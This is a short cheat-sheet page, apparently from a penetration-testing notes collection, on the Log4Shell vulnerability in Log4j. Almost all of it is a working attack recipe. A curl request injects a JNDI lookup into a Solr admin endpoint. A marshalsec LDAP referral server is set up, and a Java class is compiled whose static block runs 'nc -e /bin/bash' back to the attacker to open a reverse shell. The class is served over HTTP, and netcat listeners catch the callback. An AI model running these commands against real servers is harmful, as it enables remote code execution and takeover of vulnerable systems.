---
title: Log4Shell
desc: A zero-day vulnerability in Log4j.
tags: [Log4j]
alts: [Log4Unifi]
website: https://github.com/NCSC-NL/log4shell
render_with_liquid: false
---

## Proof of Concept

```sh
nc -lvnp 4444

curl 'http://<target-ip>:8983/solr/admin/cores?foo=$\{jndi:ldap://<attacker-ip>:4444\}
```

<br />

## Exploit (JNDI)

```sh
# On attack machine 1

# Install maven
sudo apt install maven

git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
# Build the marshalsec utility
mvn clean package -DskipTests
# Start the LDAP server
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<attacker-ip>:8000/#Exploit"

# ---------------------------------------------------------------------

# On attack machine 2

mkdir exploit
cd exploit
vim Exploit.java

# Exploit.java
public class Exploit {
  static {
    try {
      java.lang.Runtime.getRuntime().exec("nc -e /bin/bash <attacker-ip> <attacker-listen-port>");
    } catch (Exception e) {
      e.printStackTrace();
    }
  }
}

# Compile the payload
javac Exploit.java -source 8 -target 8

# Host it by http server
python3 -m http.server 8000

# ----------------------------------------------------------------------

# On attack machine 3

nc -lvnp 4444


# ----------------------------------------------------------------------

# On attack machine 4

curl 'http://<target-ip>:<target-port>/solr/admin/cores?foo=$\{jndi:ldap://<attacker-ip>:1389/Exploit\}'
```